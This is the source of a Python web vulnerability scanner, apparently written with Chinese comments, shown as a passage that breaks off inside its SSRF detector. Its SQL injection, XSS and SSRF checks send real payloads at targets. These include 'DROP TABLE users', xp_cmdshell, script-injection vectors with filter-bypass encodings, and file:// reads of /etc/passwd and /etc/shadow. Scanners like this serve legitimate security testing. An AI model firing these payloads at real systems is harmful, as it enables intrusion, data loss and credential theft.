#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
URL Security Scanner - 自动化Web漏洞扫描器
支持OWASP TOP10基础检测、子域名枚举、目录爆破等
"""

import os
import sys
import io

# Fix Windows GBK terminal emoji encoding crash
if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
import json
import re
import time
import hashlib
import logging
import socket
import ssl
import subprocess
from urllib.parse import urlparse, urljoin, urlencode, quote_plus
from urllib.robotparser import RobotFileParser
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field, asdict
from enum import Enum

import requests
from bs4 import BeautifulSoup
import tldextract

# Shannon上下文感知模块（白盒驱动的黑盒扫描增强）
try:
    from shannon_context import (
        ContextAnalyzer,
        ContextAwarePayloadGenerator,
        APIEndpointDiscoverer,
        DataFlowTracer,
        APIEndpoint,
    )
    HAS_SHANNON_CTX = True
except ImportError:
    HAS_SHANNON_CTX = False

# ==================== 配置 ====================

logger = logging.getLogger('url_scanner')

CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'config.json')
with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
    CONFIG = json.load(f)


class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

    def __lt__(self, other):
        order = {Severity.INFO: 0, Severity.LOW: 1, Severity.MEDIUM: 2, Severity.HIGH: 3, Severity.CRITICAL: 4}
        return order[self] < order[other]


@dataclass
class VulnFinding:
    id: str
    severity: Severity
    title: str
    description: str
    url: str
    evidence: str = ""
    recommendation: str = ""
    cwe: str = ""
    cvss: float = 0.0
    params: dict = field(default_factory=dict)

    def to_dict(self):
        d = asdict(self)
        d['severity'] = self.severity.value
        return d


@dataclass
class ScanResult:
    target_url: str
    hostname: str
    findings: List[VulnFinding] = field(default_factory=list)
    http_headers: Dict[str, str] = field(default_factory=dict)
    ssl_info: Dict = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    discovered_urls: List[str] = field(default_factory=list)
    dir_bust_results: List[Dict] = field(default_factory=list)
    # w3af整合新增字段
    openapi_urls: List[Dict] = field(default_factory=list)  # 发现的OpenAPI文档
    cms_fingerprints: List[str] = field(default_factory=list)  # CMS指纹识别结果
    dvcs_leaks: List[Dict] = field(default_factory=list)  # VCS泄露详情
    http_methods: Dict[str, Dict] = field(default_factory=dict)  # HTTP方法检测结果
    # Shannon上下文增强信息
    context_info: Dict = field(default_factory=dict)  # 白盒分析上下文摘要
    contextual_endpoints: List[APIEndpoint] = field(default_factory=list)  # 发现的API端点
    data_flow_traces: List[Dict] = field(default_factory=list)  # Source→Sink追踪结果

    @property
    def finding_count(self):
        return len(self.findings)

    @property
    def critical_count(self):
        return sum(1 for f in self.findings if f.severity == Severity.CRITICAL)

    @property
    def high_count(self):
        return sum(1 for f in self.findings if f.severity == Severity.HIGH)

    def add_finding(self, finding: VulnFinding):
        if not any(f.id == finding.id for f in self.findings):
            self.findings.append(finding)


# ==================== HTTP客户端 ====================
class SecureHTTPClient:
    """带重试和错误处理的HTTP客户端 — 支持代理"""

    def __init__(self, timeout=30, max_retries=3, proxy: Dict[str, str] = None):
        self.session = requests.Session()
        ua = CONFIG['scanner']['user_agent']
        self.session.headers.update({
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        })
        self.timeout = timeout
        self.max_retries = max_retries
        # 代理支持
        if proxy and proxy.get('enabled'):
            proxies = {}
            http = proxy.get('http', '') or proxy.get('https', '')
            https = proxy.get('https', '') or http
            if http:
                proxies['http'] = http
            if https:
                proxies['https'] = https
            if proxies:
                self.session.proxies.update(proxies)
                logger.info(f"🕸️ 代理已启用: {proxies}")
        elif proxy and not proxy.get('enabled'):
            self.session.proxies = {}
            logger.debug("代理未启用")

    def get(self, url: str, params: dict = None, **kwargs) -> Optional[requests.Response]:
        for attempt in range(self.max_retries):
            try:
                resp = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=True, **kwargs)
                return resp
            except requests.exceptions.SSLError:
                logger.warning(f"SSL Error on {url}, retrying without verification...")
                self.session.verify = False
                try:
                    resp = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=True, **kwargs)
                    return resp
                except Exception as e:
                    logger.error(f"Failed after SSL retry: {e}")
            except Exception as e:
                logger.warning(f"Attempt {attempt+1}/{self.max_retries} failed for {url}: {e}")
                time.sleep(1 * (attempt + 1))
        return None


# ==================== SSL/TLS检测 ====================
class SSLChecker:
    """SSL/TLS证书安全检查"""

    @staticmethod
    def check(url: str) -> Dict[str, Any]:
        result = {
            'valid': False,
            'issuer': '',
            'subject': '',
            'expiry': None,
            'protocol': '',
            'key_size': 0,
            'warnings': []
        }

        try:
            hostname = urlparse(url).hostname
            if not hostname:
                return result

            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    result['protocol'] = ssock.version() or 'unknown'
                    cert = ssock.getpeercert()
                    if cert:
                        result['valid'] = True
                        # issuer/subject 是 list of (oid_short, value) tuples
                        # 某些条目可能只有 OID 没有 value（单元素 tuple），需要安全解包
                        def _cert_field(field_list):
                            parts = []
                            for item in field_list:
                                if isinstance(item, tuple) and len(item) == 2:
                                    parts.append(f'{item[0]}={item[1]}')
                                elif isinstance(item, str):
                                    parts.append(item)
                                else:
                                    parts.append(str(item))
                            return ', '.join(parts)
                        
                        result['issuer'] = _cert_field(cert['issuer'])
                        result['subject'] = _cert_field(cert['subject'])

                        # 检查证书有效期
                        from datetime import datetime
                        expiry_str = cert['notAfter']
                        expiry_date = datetime.strptime(expiry_str, '%b %d %H:%M:%S %Y GMT')
                        result['expiry'] = expiry_date.strftime('%Y-%m-%d')

                        days_left = (expiry_date - datetime.now()).days
                        if days_left < 30:
                            result['warnings'].append(f"证书将在{days_left}天后过期")
                        elif days_left < 7:
                            result['warnings'].append(f"⚠️ 证书即将在{days_left}天后过期 - HIGH风险")

                    cert_bin = ssock.getpeercert(binary_form=True)
                    import hashlib as hl
                    fingerprint_sha256 = hl.sha256(cert_bin).hexdigest().upper()
                    result['fingerprint'] = fingerprint_sha256

                    # 检查协议版本（TLSv1.2+ 均视为安全）
                    proto = result['protocol'] or ''
                    unsafe_protocols = ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1']
                    is_unsafe = any(p in proto for p in unsafe_protocols)
                    if is_unsafe:
                        result['warnings'].append(f"使用不安全的TLS协议: {proto}")

        except ssl.SSLCertVerificationError as e:
            result['valid'] = False
            result['warnings'].append(f"SSL证书验证失败: {e}")
        except Exception as e:
            result['warnings'].append(f"SSL检查异常: {str(e)}")

        return result


# ==================== HTTP头检测 ====================
class HeaderChecker:
    """HTTP安全头检测"""

    CHECKS = [
        {
            'name': 'X-Content-Type-Options',
            'value': 'nosniff',
            'cwe': 'CWE-693',
            'severity': Severity.MEDIUM,
            'title': '缺少 X-Content-Type-Options 头',
            'desc': '服务器未设置 X-Content-Type-Options: nosniff，可能导致MIME类型混淆攻击',
            'rec': '添加响应头: X-Content-Type-Options: nosniff'
        },
        {
            'name': 'X-Frame-Options',
            'value': None,
            'cwe': 'CWE-1021',
            'severity': Severity.MEDIUM,
            'title': '缺少 X-Frame-Options 头',
            'desc': '未设置 X-Frame-Options，网站可能被嵌入iframe进行点击劫持攻击',
            'rec': '添加响应头: X-Frame-Options: DENY 或 SAMEORIGIN'
        },
        {
            'name': 'Content-Security-Policy',
            'value': None,
            'cwe': 'CWE-693',
            'severity': Severity.MEDIUM,
            'title': '缺少 Content-Security-Policy (CSP)',
            'desc': '未配置内容安全策略，无法防御XSS攻击',
            'rec': '添加CSP头: Content-Security-Policy: default-src \'self\''
        },
        {
            'name': 'Strict-Transport-Security',
            'value': None,
            'cwe': 'CWE-319',
            'severity': Severity.MEDIUM,
            'title': '缺少 HSTS 头',
            'desc': '未启用HTTP严格传输安全，可能存在降级攻击风险',
            'rec': '添加响应头: Strict-Transport-Security: max-age=31536000; includeSubDomains'
        },
        {
            'name': 'X-XSS-Protection',
            'value': None,
            'cwe': 'CWE-1021',
            'severity': Severity.LOW,
            'title': '缺少 X-XSS-Protection 头',
            'desc': '未设置浏览器XSS过滤器保护',
            'rec': '添加响应头: X-XSS-Protection: 1; mode=block'
        },
        {
            'name': 'Referrer-Policy',
            'value': None,
            'cwe': 'CWE-200',
            'severity': Severity.LOW,
            'title': '缺少 Referrer-Policy 头',
            'desc': '未设置引用策略，可能导致敏感URL信息泄露',
            'rec': '添加响应头: Referrer-Policy: strict-origin-when-cross-origin'
        },
        {
            'name': 'Permissions-Policy',
            'value': None,
            'cwe': 'CWE-16',
            'severity': Severity.LOW,
            'title': '缺少 Permissions-Policy 头',
            'desc': '未限制浏览器API权限',
            'rec': '添加响应头: Permissions-Policy: geolocation=(), microphone=(), camera=()'
        },
        {
            'name': 'Server',
            'value': None,
            'cwe': 'CWE-200',
            'severity': Severity.LOW,
            'title': '暴露 Server 信息',
            'desc': '服务器版本信息泄露，攻击者可利用已知漏洞',
            'rec': '在服务器配置中隐藏或模糊Server头信息'
        },
        {
            'name': 'X-Powered-By',
            'value': None,
            'cwe': 'CWE-200',
            'severity': Severity.LOW,
            'title': '暴露 X-Powered-By 信息',
            'desc': '技术栈信息泄露，可能帮助攻击者定位已知漏洞',
            'rec': '在应用中移除X-Powered-By响应头'
        },
    ]

    @staticmethod
    def check(headers: Dict[str, str]) -> List[VulnFinding]:
        findings = []

        # 检查敏感头暴露
        sensitive_headers = ['X-Powered-By', 'Server', 'X-AspNet-Version', 'X-AspNetMvc-Version']
        for hdr in sensitive_headers:
            if hdr.lower() in [h.lower() for h in headers]:
                actual_val = headers.get(hdr, headers.get(hdr.title(), ''))
                findings.append(VulnFinding(
                    id=f'HEADER_{hdr.upper()}',
                    severity=Severity.LOW,
                    title=f'{hdr} 头暴露信息',
                    description=f'HTTP响应头 {hdr} 泄露了技术栈信息: {actual_val}',
                    url='', evidence=actual_val, recommendation='移除该敏感响应头',
                    cwe='CWE-200', cvss=3.1
                ))

        # 检查缺失的安全头
        header_keys = [h.lower() for h in headers.keys()]
        for check in HeaderChecker.CHECKS:
            found = any(c == check['name'].lower() for c in header_keys)
            if not found and check['value'] is None:
                # 缺失检查
                findings.append(VulnFinding(
                    id=f'MISSING_{check["name"].upper()}',
                    severity=check['severity'],
                    title=check['title'],
                    description=check['desc'],
                    url='', recommendation=check['rec'],
                    cwe=check['cwe'], cvss=4.3 if check['severity'] == Severity.MEDIUM else 2.0,
                    params={'header': check['name']}
                ))

        return findings


# ==================== CORS检测 ====================
class CORSChecker:
    """CORS安全配置检测"""

    @staticmethod
    def check(url: str, resp: requests.Response) -> List[VulnFinding]:
        findings = []
        access_control_origin = resp.headers.get('Access-Control-Allow-Origin', '')
        access_control_methods = resp.headers.get('Access-Control-Allow-Methods', '')
        access_control_cred = resp.headers.get('Access-Control-Allow-Credentials', '')

        if not access_control_origin:
            return findings  # 无CORS头，安全

        if access_control_origin == '*':
            findings.append(VulnFinding(
                id='CORS_WILDCARD',
                severity=Severity.HIGH,
                title='CORS允许所有来源 (*)',
                description='Access-Control-Allow-Origin: * 允许任何域名跨域访问，可能导致数据泄露',
                url=url,
                evidence='Access-Control-Allow-Origin: *',
                recommendation='限制允许的域名列表，不要使用通配符 *',
                cwe='CWE-942', cvss=7.5
            ))

        if access_control_cred.lower() == 'true' and (access_control_origin == '*' or access_control_origin == ''):
            findings.append(VulnFinding(
                id='CORS_CREDENTIALS_STAR',
                severity=Severity.CRITICAL,
                title='CORS允许携带凭证 + 通配符来源',
                description='Access-Control-Allow-Credentials: true 与 Access-Control-Allow-Origin: * 同时存在，任何网站都可以读取该接口的受保护数据',
                url=url,
                evidence='Allow-Credentials: true, Allow-Origin: *',
                recommendation='禁止同时使用 credentials 和通配符来源',
                cwe='CWE-942', cvss=9.1
            ))

        if 'DELETE' in access_control_methods and access_control_origin == '*':
            findings.append(VulnFinding(
                id='CORS_METHODS_STAR',
                severity=Severity.HIGH,
                title='CORS允许危险HTTP方法对所有来源',
                description='CORS策略允许所有域名使用DELETE等危险方法',
                url=url,
                evidence=f'Allow-Methods: {access_control_methods}, Allow-Origin: *',
                recommendation='限制允许的HTTP方法为必要的GET/POST',
                cwe='CWE-942', cvss=7.5
            ))

        return findings


# ==================== 子域名枚举 ====================
class SubdomainEnum:
    """子域名枚举"""

    # 常用子域名列表
    COMMON_SUBDOMAINS = [
        'www', 'mail', 'ftp', 'vpn', 'api', 'dev', 'staging', 'test',
        'admin', 'login', 'app', 'db', 'cdn', 'static', 'media', 'blog',
        'shop', 'pay', 'auth', 'oauth', 'sso', 'portal', 'dashboard',
        'internal', 'intranet', 'git', 'svn', 'jenkins', 'docker',
        'k8s', 'kube', 'monitor', 'grafana', 'elastic', 'log',
        'docs', 'wiki', 'forum', 'support', 'help', 'status',
        'backup', 'old', 'new', 'beta', 'alpha', 'uat',
        'smtp', 'imap', 'pop', 'dns', 'mx', 'ns1', 'ns2',
    ]

    @staticmethod
    def enum(base_domain: str) -> List[str]:
        found = set()

        # 方法1: 暴力枚举常见子域名
        for sub in SubdomainEnum.COMMON_SUBDOMAINS:
            domain = f"{sub}.{base_domain}"
            try:
                socket.getaddrinfo(domain, None)
                found.add(domain)
                logger.info(f"✅ 找到子域名: {domain}")
            except socket.gaierror:
                pass

        # 方法2: crt.sh证书透明度API (免费且有效)
        try:
            import urllib.request
            url = f"https://crt.sh/?q=%25.{base_domain}&output=json"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode())
                for entry in data[:200]:  # 取前200个结果
                    names = entry.get('name_value', '').split('\n')
                    for name in names:
                        if base_domain in name:
                            found.add(name.strip())
            logger.info(f"crt.sh 枚举完成，额外找到 {len(found)} 个子域名")
        except Exception as e:
            logger.warning(f"crt.sh枚举失败: {e}")

        return sorted(found)


# ==================== SQL注入检测 ====================
class SQLiDetector:
    """SQL注入漏洞检测 — 支持Shannon上下文感知的**动态Payload生成**（白盒驱动的针对性测试）\n\n核心改进：
- 当文件分析发现 $_GET['id'] 时，自动推断为 int/string/path/url
- 按类型精准发送payload，而非静态一股脑全试
- 框架特异性增强（Django/Flask/Spring）
- 编码混淆变体链（注释/URL编码/引号逃逸）
"""

    # === 无上下文时的兜底payload（与之前一致） ===
    BASE_PAYLOADS = [
        ("' OR '1'='1", "单引号+OR tautology"),
        ("' OR 1=1 -- ", "数字OR注释"),
        ("admin' --", "用户名绕过"),
        ("' UNION SELECT NULL--", "UNION联合注入"),
        ("'; DROP TABLE users --", "DDL注入尝试"),
        ("1; EXEC xp_cmdshell('dir')--", "存储过程注入(SQL Server)"),
        ("' AND SLEEP(5)--", "时间盲注"),
        ("benchmark(10000000,SHA1('test'))--", "MySQL时间盲注"),
        ("' OR 'a'='a'/**/LIMIT/**/1--", "注释绕过"),
    ]

    @staticmethod
    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
        """
        SQLi检测 — 支持上下文感知
        
        Args:
            url: 目标URL
            context: 可选的Shannon上下文数据（白盒分析结果）
                     - matched_vars: SourceInfo列表
                     - framework: 框架名称 (django, flask, spring...)
                     - data_flows: Source→Sink追踪结果
                     - language_flow_count: SQL相关数据流数
        """
        findings = []
        parsed = urlparse(url)

        if not parsed.query:
            return findings

        # 解析查询参数并收集上下文信息
        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        test_params = SQLiDetector._get_testable_params(params, url)

        # 从URL参数名推断变量类型
        var_type_map = {}
        for pn in test_params:
            var_type_map[pn.lower()] = SQLiDetector._infer_var_type(pn)

        # Shannon上下文感知的payloads
        contextual_payloads = []
        framework = ''
        matched_vars_info = []
        data_flow_count = 0
        
        if context and HAS_SHANNON_CTX:
            framework = context.get('framework', '')
            matched_vars_info = context.get('matched_vars', [])
            data_flow_count = context.get('data_flows', {}).get('sql_flow_count', 0)
            # 使用上下文感知的payload生成器
            for param_name in test_params:
                vtype = var_type_map.get(param_name, '')
                ctx_payloads = ContextAwarePayloadGenerator.generate_sqli_payloads(
                    var_name=param_name,
                    var_type=vtype,
                    context={'framework': framework}
                )
                for cp in ctx_payloads:
                    contextual_payloads.append((cp['payload'], f'上下文适配: {cp["description"]}'))

        # 合并payloads（上下文优先，基础payload兜底）
        all_payloads = contextual_payloads if contextual_payloads else SQLiDetector.BASE_PAYLOADS
        
        # 如果有数据流追踪结果（白盒发现SQL注入点），标记为高置信度并增加测试
        has_data_flow_sqli = data_flow_count > 0
        
        for param_name, original_val in test_params.items():
            param_type = var_type_map.get(param_name, '')
            
            # 如果白盒分析发现这个参数有SQL相关数据流，优先测试
            if has_data_flow_sqli:
                logger.info(f"  ⚡ 白盒线索: 参数 {param_name} 存在Source→Sink SQL数据流 — 增强测试")
                # 对高置信度变量先用针对性的payload
                if param_type == 'int':
                    int_payloads = [
                        ("1 OR 1=1", "数字注入-tautology"),
                        ("-1 UNION SELECT NULL--", "UNION null列数探测"),
                        ("-1 UNION SELECT 1,2,3--", "UNION数值列探测"),
                        ("1 AND SLEEP(5)--", "时间盲注"),
                    ]
                    for payload, desc in int_payloads:
                        context_test = {'framework': framework, 'sql_flow_count': data_flow_count}
                        findings.extend(SQLiDetector._test_url(
                            url, params, param_name, original_val,
                            payload, f"白盒增强-[{param_type}] {desc}",
                            context_test
                        ))
                    continue
                elif param_type == 'string':
                    str_payloads = [
                        ("' OR '1'='1", "字符串注入-tautology"),
                        ("' UNION SELECT NULL--", "UNION联合注入"),
                        ("admin' --", "用户名绕过"),
                        ("' AND SLEEP(5)--", "时间盲注"),
                    ]
                    for payload, desc in str_payloads:
                        context_test = {'framework': framework, 'sql_flow_count': data_flow_count}
                        findings.extend(SQLiDetector._test_url(
                            url, params, param_name, original_val,
                            payload, f"白盒增强-[{param_type}] {desc}",
                            context_test
                        ))
                    continue
            
            # 无上下文或通用测试 — 遍历所有payloads
            for payload, desc in all_payloads:
                # 如果已有白盒线索，跳过与上下文不匹配的payload（如路径类型url注入不用SQL payloads）
                if has_data_flow_sqli and param_type == 'path':
                    if any(kw in payload.lower() for kw in ['union', 'select', 'or ', "'"]):
                        # path类型的参数用SSRF/lfi payloads代替
                        pass  # 跳过，后面URLScanner会处理SSRF/LFI
                
                context_test = {'framework': framework, 'sql_flow_count': data_flow_count if has_data_flow_sqli else 0}
                findings.extend(SQLiDetector._test_url(
                    url, params, param_name, original_val,
                    payload, desc, context_test
                ))

        return findings

    @staticmethod
    def _test_url(url: str, params: dict, param_name: str, original_val: str,
                  payload: str, desc: str, context_info: Dict) -> List[VulnFinding]:
        """测试单个payload并生成finding — 修复: 添加return findings"""
        findings = []
        parsed = urlparse(url)

        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        test_params_copy = params.copy()
        test_params_copy[param_name] = quote_plus(original_val) + quote_plus(payload)
        query_str = '&'.join(f"{k}={quote_plus(v)}" for k, v in test_params_copy.items())
        test_url += f"?{query_str}"

        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False,
                               headers={'User-Agent': CONFIG['scanner']['user_agent']})

            if resp.status_code == 500:
                has_flows = context_info.get('sql_flow_count', 0) > 0
                severity = Severity.CRITICAL if has_flows else Severity.HIGH
                confidence = 'high' if has_flows else 'medium'
                findings.append(VulnFinding(
                    id=f'SQLi_500_{param_name}',
                    severity=severity,
                    title=f'GET {param_name} 可能存在SQL注入 [白盒增强]',
                    description=f'参数 {param_name} 使用载荷 "{desc}" 返回HTTP 500错误，可能泄露数据库信息。'
                               + (f'白盒分析发现相关数据流链路，置信度提升为高。' if has_flows else '建议进一步验证。'),
                    url=test_url, evidence=f'Status: 500\nPayload: {payload}',
                    recommendation='使用参数化查询，对用户输入进行严格的类型检查和过滤',
                    cwe='CWE-89', cvss=9.1 if has_flows else 8.6,
                    params={'param': param_name}
                ))

            # 时间盲注检测
            start_time = time.time()
            try:
                requests.get(test_url, timeout=15,
                             headers={'User-Agent': CONFIG['scanner']['user_agent']})
                elapsed = time.time() - start_time
                if elapsed > 4:
                    has_flows = context_info.get('sql_flow_count', 0) > 0
                    findings.append(VulnFinding(
                        id=f'SQLi_TIME_{param_name}',
                        severity=Severity.HIGH,
                        title=f'GET {param_name} 可能存在时间盲注 [白盒增强]',
                        description=f'参数 {param_name} 的响应时间明显延长({elapsed:.2f}s)，可能触发数据库SLEEP函数',
                        url=test_url, evidence=f'Delay: {elapsed:.2f}s\\nPayload: {payload}',
                        recommendation='使用参数化查询，检查后端SQL语句拼接逻辑',
                        cwe='CWE-89', cvss=7.5,
                        params={'param': param_name}
                    ))
            except requests.exceptions.ReadTimeout:
                pass

            # 错误信息泄露检测
            error_patterns = [
                r'SQL.*error|mySQL|integrity.*violation|unique.*constraint',
                r'ORA-\\d+|PLS-\\d+|Oracle', r'Microsoft.*SQL.*Server',
                r'Syntax.*error|unterminated.*string|unclosed.*quotation',
                r'sqlalchemy|Flask-SQLAlchemy|Django.*IntegrityError',
            ]
            for pat in error_patterns:
                if re.search(pat, resp.text, re.IGNORECASE):
                    has_flows = context_info.get('sql_flow_count', 0) > 0
                    findings.append(VulnFinding(
                        id=f'SQLi_ERROR_{param_name}',
                        severity=Severity.HIGH,
                        title=f'GET {param_name} 存在SQL错误信息泄露 [白盒增强]',
                        description=f'参数 {param_name} 的响应包含SQL错误详情，可能泄露数据库结构',
                        url=test_url,
                        evidence=re.search(pat, resp.text, re.IGNORECASE).group(0)[:200],
                        recommendation='关闭数据库详细错误提示，使用统一的错误页面',
                        cwe='CWE-209', cvss=6.5,
                        params={'param': param_name}
                    ))

        except Exception as e:
            logger.debug(f'SQLi test failed for {param_name}: {e}')

        return findings

    @staticmethod
    def _infer_var_type(param_name: str) -> str:
        """根据参数名推断变量类型（用于Shannon上下文感知的payload选择）"""
        pn = param_name.lower()
        int_keywords = ['id', 'uid', 'pid', 'sid', 'cid', 'num', 'count', 'size', 'age', 'rank', 'level', 'order']
        path_keywords = ['path', 'dir', 'route', 'url', 'uri', 'href', 'link', 'loc', 'source']
        url_keywords = ['url', 'uri', 'src', 'target', 'redirect', 'dest', 'goto', 'next_page', 'continue']
        email_keywords = ['email', 'mail', 'e-mail', 'address']

        if any(kw in pn for kw in int_keywords):
            return 'int'
        if any(kw in pn for kw in path_keywords):
            # URL/URI类型走SSRF路径（避免SQL payloads）
            if any(kw in pn for kw in url_keywords):
                return 'url'
            return 'path'
        if any(kw in pn for kw in email_keywords):
            return 'email'
        # 默认推测为string（名称、文本类参数）
        return 'string'

    @staticmethod
    def _get_testable_params(params: dict, url: str) -> dict:
        """筛选可测试的参数"""
        testable = {}
        # 优先测试常见的敏感参数
        sensitive_keywords = ['id', 'uid', 'user', 'name', 'email', 'file',
                             'path', 'url', 'page', 'sort', 'order', 'search',
                             'query', 'filter', 'where', 'select']

        for param_name, value in params.items():
            if len(value) < 100:  # 跳过过长的参数值
                testable[param_name] = value
                continue
            if any(kw in param_name.lower() for kw in sensitive_keywords):
                testable[param_name] = value

        return testable


# ==================== XSS检测 ====================
class XSSDetector:
    """XSS漏洞检测"""

    PAYLOADS = [
        ("<script>alert(1)</script>", "经典script标签"),
        ("<img src=x onerror=alert(1)>", "img onerror事件"),
        ("<svg/onload=alert(1)>", "SVG onload"),
        ("<body onload=alert(1)>", "body onload"),
        ("<iframe src='javascript:alert(1)'>", "iframe javascript"),
        ("javascript:alert(1)", "javascript协议"),
        ("<a href='javascript:alert(1)'>click</a>", "link javascript"),
        ("<div style=\"background:url(javascript:alert(1))\">", "CSS expression"),
    ]

    @staticmethod
    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
        """
        XSS检测 — 支持**编码绕过链**（URL/HTML实体/JS Unicode多通道验证）
        
        对每个发现的可疑输出点，生成多种编码变体测试WAF是否完整过滤。
        """
        findings = []
        parsed = urlparse(url)

        if parsed.query:
            params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
            test_params = XSSDetector._get_testable_params(params, url)

            for param_name, original_val in test_params.items():
                for payload, desc in XSSDetector.PAYLOADS:
                    # === 优化2: 编码绕过链 — 每个原始payload生成3种编码变体 ===
                    encoding_chains = XSSDetector._generate_encoding_bypass_chain(payload)
                    payloads_to_test = [
                        (payload, desc)  # 原始payload
                    ] + encoding_chains

                    for test_payload, variant_desc in payloads_to_test:
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        test_params_copy = params.copy()
                        # 替换参数值，使用编码后的payload
                        query_str = '&'.join(
                            f"{k}={quote_plus(v)}" if k != param_name else f"{k}={test_payload}"
                            for k, v in test_params_copy.items()
                        )
                        test_url += f"?{query_str}"

                        try:
                            resp = requests.get(test_url, timeout=10, allow_redirects=False,
                                               headers={'User-Agent': CONFIG['scanner']['user_agent']})

                            # 检查响应中是否回显原始payload（用于判断输出点）
                            escaped_payload = payload.strip()
                            if escaped_payload in resp.text:
                                findings.append(VulnFinding(
                                    id=f'XSS_REFLECTED_{param_name}_{variant_desc[:10]}',
                                    severity=Severity.HIGH,
                                    title=f'GET {param_name} 存在反射型XSS [{variant_desc}]',
                                    description=f'参数 {param_name} 的回显中检测到XSS载荷。变体: {variant_desc}\n原始载荷: {escaped_payload[:80]}',
                                    url=test_url, evidence=f"Variant: {variant_desc}\nPayload: {test_payload[:200]}",
                                    recommendation='对所有用户输入进行HTML实体编码，使用Content-Type: text/html; charset=utf-8，并实施CSP策略',
                                    cwe='CWE-79', cvss=7.5, params={'param': param_name, 'encoding_variant': variant_desc}
                                ))

                            # 检查是否被框架自动转义 (常见的WAF/框架响应特征)
                            if any(w in resp.text.lower() for w in ['blocked', 'filtered', 'sanitized']):
                                logger.info(f"  WAF可能拦截了XSS测试 [{variant_desc}] (参数: {param_name})")

                        except Exception as e:
                            logger.debug(f"XSS test failed for {param_name} [{variant_desc}]: {e}")

        return findings

    @staticmethod
    def _generate_encoding_bypass_chain(payload: str) -> List[Tuple[str, str]]:
        """
        对XSS payload生成编码变体链（URL/HTML实体/JS Unicode/大小写混淆/双重编码）。
        用于测试WAF是否完整过滤各种编码方式。

        返回: [(encoded_payload, variant_desc), ...]
        """
        chains = []
        if not payload or not payload.strip():
            return chains

        # === URL百分比编码变体 (%3Cscript%3E) ===
        url_encoded = ''.join(
            '%' + format(ord(c), '02X')
            if c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~!$&()*+,;=:@'
            else c
            for c in payload
        )
        chains.append((url_encoded, 'url_encoded'))

        # === HTML实体编码变体 (&lt;script&gt;) ===
        html_map = {
            '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;',
            '/': '&#x2F;', ' ': '&nbsp;', '\t': '&#x9;', '\n': '&#xA;',
        }
        html_entity = ''.join(html_map.get(c, c) for c in payload)
        chains.append((html_entity, 'html_entity'))

        # === JS Unicode转义变体 (\u003cscript\u003e) ===
        js_unicode = ''.join(
            '\\u' + format(ord(c), '04X')
            if ord(c) > 127 or c in "<>'()= \t\n;&"
            else c
            for c in payload
        )
        chains.append((js_unicode, 'js_unicode'))

        # === 大小写混淆变体 (ScRiPt/aLtErE) ===
        case_mixed = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        chains.append((case_mixed, 'case_obfuscation'))

        # === 双重编码变体 (URL+HTML混合) ===
        double_encoded = html_entity.replace('%', '%25')
        chains.append((double_encoded, 'double_encode_url_html'))

        return chains

    @staticmethod
    def _get_testable_params(params: dict, url: str) -> dict:
        testable = {}
        sensitive_keywords = ['q', 'search', 'keyword', 'name', 'text', 'content',
                             'title', 'msg', 'comment', 'input']
        for param_name, value in params.items():
            if len(value) < 100:
                testable[param_name] = value
                continue
            if any(kw in param_name.lower() for kw in sensitive_keywords):
                testable[param_name] = value
        return testable


# ==================== SSRF检测 ====================
class SSRFDetector:
    """SSRF (服务端请求伪造) 检测"""

    # 危险协议列表
    DANGEROUS_PROTOCOLS = ['file', 'gopher', 'dict', 'ftp', 'tftp', 'ldap', 'ldaps']

    @staticmethod
    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)

        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        testable = SSRFDetector._get_testable_params(params, url)

        # === 扩展多协议SSRF探测（file/gopher/dict/ldap/telnet/jdbc/rmi/nfs/rtsp） ===
        ssrf_payloads = [
            ('file:///etc/passwd', 'file协议-读取本地文件'),
            ('file:///etc/shadow', 'file协议-读取shadow文件'),
            ('gopher://127.0.0.1:6379/_PING', 'gopher协议-Redis探测'),
            ('dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/', 'dict协议-Redis配置'),
            ('ftp://127.0.0.1:21/pub/', 'FTP协议-内网服务探测'),
        ]

        # 从上下文获取SSRF目标参数信息（借鉴Shannon SSRF targets）
        extra_protos = []
        if context and hasattr(context, 'get'):
            ssrf_target_params = set()
            for var in context.get('matched_vars', []):
                if isinstance(var, dict) and any(kw in (var.get('var_name', '') or '').lower() for kw in ['url', 'uri', 'source', 'proxy', 'redirect']):
                    ssrf_target_params.add(var.get('var_name', ''))
            # 如果上下文有SSRF目标线索或配置开启扩展探测，添加高级协议
            if ssrf_target_params or context.get('ssrf_extended', False):
                extra_protos = [
                    ('ldap://127.0.0.1:389/dc=example,dc=com', 'LDAP协议-目录服务探测'),
